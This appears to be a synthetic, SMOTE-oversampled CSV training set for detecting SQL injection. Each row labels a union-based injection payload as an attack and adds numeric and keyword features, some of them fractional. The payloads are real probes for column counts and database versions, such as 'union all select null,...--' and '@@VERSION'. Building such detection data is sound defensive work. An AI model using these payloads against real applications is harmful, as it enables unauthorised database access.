id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000032,attack,union,"-9156'   )    )    union all select 9110,9110,9110,9110#",nearest_attack_euclidean,R000013,1.5824106648692933,57.6288470573534,20.67423058852932,3.6827888290398847,13.999999999999998,20.0,15.303077645882716,8.325769411470679,0.24332439730592872,0.34760628186561243,0.26468632592695684,0.144382994901502,0.6742305885293209,0.0,1.651538822941358,0.0,0.0,0.0,0.0,2.325769411470679,0.0,0.0,3.0,1.651538822941358,0.674230588529321,0.0,0.32576941147067895,0.6742305885293212,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000033,attack,union,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",nearest_attack_euclidean,R000025,0.09222294654136685,69.0,20.940198194388152,3.5362349567423723,13.999999999999998,40.0,3.999999999999999,11.0,0.2028985507246377,0.5797101449275363,0.05797101449275363,0.15942028985507245,0.9800660647960511,0.0,1.0398678704078974,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0,1.0398678704078979,0.9800660647960512,0.0,0.019933935203948705,0.9800660647960513,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000034,attack,union,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",nearest_attack_euclidean,R000012,2.4139916936244257,69.41545392056031,16.753638238319052,3.3653451350691226,28.95634114017136,23.797297098147688,5.661815682241262,11.0,0.4153563527503063,0.34480234843680707,0.08136717730691632,0.1584741215059703,-5.551115123125783e-17,0.0,2.5845460794396846,0.0,0.0,0.0,0.0,0.41545392056031555,0.0,0.0,8.0,2.584546079439684,0.0,0.0,1.0,0.0,0.0,0.0,0.4154539205603156,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000035,attack,union," select * from users where id  =  '1'<@$$ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000006,1.0072608975372874,78.9334061998434,27.542888371361457,4.026675005738529,40.15237054287951,3.9142232572770883,21.781035656963883,13.085776742722912,0.5093927046980523,0.05057151403812274,0.27500248458231374,0.16503329668151118,2.6952589142409704,0.0,2.0,0.0,0.8476294571204853,1.0,0.0,1.8476294571204854,0.0,0.0,1.1523705428795146,4.847629457120485,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.8476294571204852,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.847629457120485
SMOTE_000036,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000008,0.09687404070626669,59.54357351064091,18.091285297871817,3.5335637950721046,13.999999999999998,31.634858808512725,3.999999999999999,9.908714702128181,0.23526968813667495,0.5311203564152287,0.06721991089619284,0.16639004455190357,-5.551115123125783e-17,1.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.908714702128181,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000037,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000007,1.8356152859287123,71.24901419070231,15.416338063567439,3.0951892901708513,46.66929549146049,1.0,12.16338063567439,11.416338063567439,0.6564383512460115,0.014041288808081781,0.16936292191224828,0.16015743803365856,-5.551115123125783e-17,0.416338063567439,2.0,0.0,0.0,0.0,0.0,1.832676127134878,0.0,0.0,7.167323872865122,2.0,0.0,0.416338063567439,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000038,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000029,0.7761187960808188,73.16863679302921,20.16627264139416,3.6266580590534034,13.999999999999998,40.0,7.334909434423365,11.833727358605842,0.19146868094351568,0.5470533741243305,0.09977168112085691,0.16170626381129688,0.16627264139415876,0.8337273586058411,1.0,0.0,0.0,0.0,0.0,0.8337273586058412,0.0,0.0,8.0,1.0,0.16627264139415873,0.8337273586058411,0.0,1.0,0.0,0.0,0.8337273586058414,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000039,attack,union,"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--",nearest_attack_euclidean,R000031,1.3182674584835203,69.04280832196197,18.042808321961967,3.496429451663247,22.61472510234229,30.667381139129184,3.999999999999999,11.760702080490493,0.33342671875681673,0.4383126291905983,0.05797159452643985,0.1702890575261452,1.0,0.0,2.760702080490492,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0,2.760702080490492,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000040,attack,union,"1%'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000010,0.7697284363977315,56.0,16.6986891100592,3.2685518405834797,39.205243559763204,1.0,6.794756440236799,9.0,0.7000936349957715,0.01785714285714285,0.12133493643279997,0.16071428571428573,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6986891100591996,1.0,0.0,5.3013108899408,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.6986891100591996,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000041,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000022,2.295407355387752,68.73458962372273,20.26541037627727,3.5758766838332705,37.73458962372273,5.874754715745452,15.562622642127273,9.562622642127273,0.5478979407088843,0.08844385733202478,0.22558091316900827,0.13807728879008266,-5.551115123125783e-17,1.0,2.0,0.0,0.0,0.6093443394681816,0.0,1.7813113210636369,0.0,0.0,4.171966981595455,2.6093443394681817,0.0,1.0,1.0,0.0,0.0,0.6093443394681816,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.6093443394681816,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.6093443394681817
SMOTE_000042,attack,union,"1%' union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000016,0.9071011479542138,57.909746351184644,16.73451782737871,3.2261707241925985,37.886700166679226,6.729239053553938,3.999999999999999,9.293807130951484,0.6696288464245035,0.1003953521345331,0.069451608332107,0.16052419310885646,1.0,0.0,0.14690356547574202,0.0,0.0,0.0,0.0,0.0,0.853096434524258,0.0,6.293807130951484,0.1469035654757418,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000043,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000009,0.8706668865323683,63.23582643324055,21.435223142234594,3.8818533507748225,13.999999999999998,31.38866114659244,8.0,9.84716528664811,0.22370554968727263,0.4932038175717404,0.1278317426784415,0.15525889006254548,-5.551115123125783e-17,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,5.847165286648109,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000044,attack,union,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",nearest_attack_euclidean,R000012,0.6014501308065818,69.22518995609802,18.225189956098017,3.601862758112279,13.999999999999998,40.0,3.999999999999999,11.225189956098017,0.20224582621420864,0.5778452177548818,0.05778452177548819,0.16212443425542133,0.22518995609801792,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0,3.0,0.22518995609801792,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000045,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000014,2.224411848715006,69.39265100694642,18.40489932870238,3.437704473812473,25.16570469908333,14.828171140038691,18.0,11.398775167824406,0.35506135774715464,0.2208267925201141,0.2598512128143456,0.1642606369183857,0.6012248321755953,0.3987751678244047,2.6012248321755953,0.0,0.0,0.0,0.0,3.0,0.0,0.0,4.797550335648809,2.6012248321755953,0.6012248321755953,0.3987751678244047,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000046,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000008,1.086924853248747,60.66776624888887,18.667766248888867,3.5895651691368253,13.999999999999998,30.219290002963024,6.225887496296219,10.222588749629622,0.2308601250041153,0.49941504767548617,0.10129158327571897,0.16843324404467952,-5.551115123125783e-17,1.0,3.0,0.0,0.0,0.0,0.0,0.44517749925924416,0.22258874962962202,0.0,5.554822500740756,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.22258874962962205,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000047,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000008,1.821887967719285,61.729078354579116,19.0,3.6565361568062578,13.999999999999998,33.3832626836633,3.999999999999999,10.345815670915824,0.23007607871062138,0.5370559100450041,0.06573602248874896,0.16713198875562552,0.4486052236386079,0.5513947763613922,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.345815670915823,3.0,0.4486052236386079,0.5513947763613922,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000048,attack,union,"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",nearest_attack_euclidean,R000017,1.2593266915245447,63.19222102013065,21.30129649664489,3.7400837620523197,13.999999999999998,33.58962802684087,5.205185986579564,10.397407006710218,0.22198406928765865,0.5299624159113306,0.0838509009249411,0.16420261387606963,-5.551115123125783e-17,1.0,1.0,0.0,0.0,0.0,0.0,0.3012964966448912,0.6987035033551088,0.0,6.397407006710218,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.3012964966448912,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000049,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000022,1.724753265943294,63.39058427527099,23.0,3.8669040930038956,33.042938206453236,9.0,14.652353931182253,6.695292137635493,0.5204188798305719,0.14249862631205878,0.23291201139086598,0.10417048246650332,-5.551115123125783e-17,1.0,1.3476460688177467,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.0214691032266203,2.3476460688177463,0.0,1.0,0.6738230344088734,0.3261769655911267,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000050,attack,union," select * from users where id  =  1 or \.<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000004,1.288783728303196,73.54725005050308,32.72637497474846,4.399208713656149,42.54725005050308,2.7263749747484614,17.0,11.273625025251539,0.578441050514264,0.03714769369956683,0.23117748842766167,0.15323376735850747,-5.551115123125783e-17,0.0,2.0,0.0,1.2736250252515389,1.0,0.0,0.0,0.0,0.0,1.0,5.547250050503077,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.7263749747484614,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.726374974748461
SMOTE_000051,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000005,0.20681861330558604,73.21542838336906,31.10771419168453,4.341644366737702,44.0,2.0,17.0,10.215428383369057,0.6010084294304587,0.02731856497411178,0.23220780227994994,0.13946520331547954,-5.551115123125783e-17,0.0,2.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,5.215428383369057,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000052,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000003,2.1646097638893127,74.08019913741839,32.0,4.385717160196788,43.08019913741839,2.459900431290805,17.0,11.540099568709195,0.5814586617826429,0.03330267288985819,0.22952266934500226,0.1557159959824966,-5.551115123125783e-17,0.0,2.0,0.0,1.5400995687091952,1.0,0.0,0.0,0.0,0.0,1.0,6.08019913741839,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.45990043129080505,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.459900431290805
SMOTE_000053,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R000027,0.023038675979440024,61.00993408764207,20.004967043821036,3.6090953370304897,13.999999999999998,20.01986817528415,17.980131824715848,9.009934087642074,0.22947200696669554,0.32813252067121823,0.2947200696669554,0.14767540269513085,-5.551115123125783e-17,0.004967043821037631,3.0,0.0,0.0,0.0,0.0,2.9950329561789624,0.004967043821037381,0.0,3.004967043821037,3.0,0.0,0.004967043821037631,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000054,attack,union,"1%' union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000016,0.09994746159946674,56.31156646922558,16.0,3.170295043679243,42.23367485191918,1.0,3.999999999999999,9.077891617306395,0.75,0.017779869427275413,0.07111947770910161,0.16110065286362302,1.0,0.0,0.0389458086531973,0.0,0.0,0.0,0.0,0.0,1.0,0.0,6.058418712979797,0.0389458086531973,1.0,0.0,0.01947290432659876,0.9805270956734011,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000055,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000030,0.34649703997352155,73.54630028719616,16.0,3.152636541092913,42.485600255285476,1.0,18.0,12.060700031910685,0.5774313743023055,0.013607367142132287,0.24493260855838106,0.1640286499971811,0.06070003191068429,0.9392999680893155,1.8785999361786314,0.0,0.0,0.0,0.0,3.0,0.0,0.0,6.121400063821369,1.8785999361786314,0.06070003191068446,0.9392999680893155,0.9392999680893157,0.06070003191068435,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000056,attack,union,"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--",nearest_attack_euclidean,R000031,1.3124700128383031,69.04701783702643,18.04701783702643,3.4970864980546854,22.576839466762102,30.708423911007717,3.999999999999999,11.761754459256608,0.33283993786904276,0.43889804335270194,0.05796794992465243,0.1702940688536029,1.0,0.0,2.7617544592566086,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0,2.761754459256608,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000057,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000007,0.2908360205347325,70.19789458041664,15.06596486013888,3.057618066832081,49.47228111888895,1.0,8.659648601388813,11.065964860138882,0.70512034232904,0.014246987361953706,0.12301218110643518,0.15762048920257116,-5.551115123125783e-17,0.06596486013888148,2.0,0.0,0.0,0.0,0.0,1.131929720277763,0.0,0.0,7.868070279722237,2.0,0.0,0.06596486013888148,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000058,attack,union," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000002,3.152845784690588,73.0,28.85427919743205,4.21114515367539,41.550611313918864,5.696332116486815,16.10122262783773,9.651833941756593,0.5691864563550529,0.07803194680118924,0.22056469353202365,0.13221690331173414,0.44938868608113586,0.0,2.0,0.0,0.5506113139188641,1.0,0.0,0.4493886860811359,0.0,0.0,1.4493886860811358,4.550611313918864,0.44938868608113586,0.0,1.0,0.0,0.0,1.0,0.44938868608113586,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.550611313918864,0.0,0.5506113139188642,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.101222627837728
SMOTE_000059,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000008,1.668586861723507,63.8140494546512,18.38140494546512,3.5682013462147695,13.999999999999998,35.051239563720955,3.999999999999999,10.762809890930239,0.22061983515116268,0.5478630455415283,0.0630342386146179,0.16848288069269104,0.3814049454651195,0.6185950545348803,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.762809890930239,3.0,0.3814049454651196,0.6185950545348803,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000060,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000009,0.5614824638365296,59.57735694764263,22.0,3.9220811283257144,13.999999999999998,26.845286104714752,9.73207084292787,9.0,0.23504223471325458,0.45115473343822643,0.16270445238999814,0.15109857945852082,-5.551115123125783e-17,1.0,1.0,0.0,0.0,0.0,0.0,1.2886784738213115,0.0,0.0,4.711321526178688,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000061,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000011,0.6158070120925552,73.69047550717248,24.901360641832504,3.9906646746216268,38.82993412031509,11.663262670522393,14.901360641832504,8.295918074502488,0.5296704957172825,0.1555143656478737,0.20247297846681261,0.11234216016803114,0.901360641832504,0.09863935816749603,2.098639358167496,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.295918074502488,4.0,0.9013606418325041,0.09863935816749603,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.901360641832504,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.901360641832504
SMOTE_000062,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000005,0.09080225539928276,73.0,31.01980932403537,4.3357363013055235,43.96038135192926,2.0198093240353714,17.0,10.019809324035371,0.6021970048209486,0.027668620877196876,0.2328767123287671,0.13725766197308725,-5.551115123125783e-17,0.0,2.0,0.0,1.9801906759646288,1.0,0.0,0.0,0.0,0.0,1.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,1.0,0.0,0.019809324035371167,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.019809324035371
SMOTE_000063,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000026,0.021384168286474162,60.978011248926165,22.0,3.7934708334454355,13.999999999999998,24.04397750214767,13.934033746778494,9.0,0.2295937322909235,0.39433463674820224,0.2284756602024234,0.14759597075845082,-5.551115123125783e-17,1.0,1.0,0.0,0.0,0.0,0.0,1.9890056244630823,0.0,0.0,4.010994375536917,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
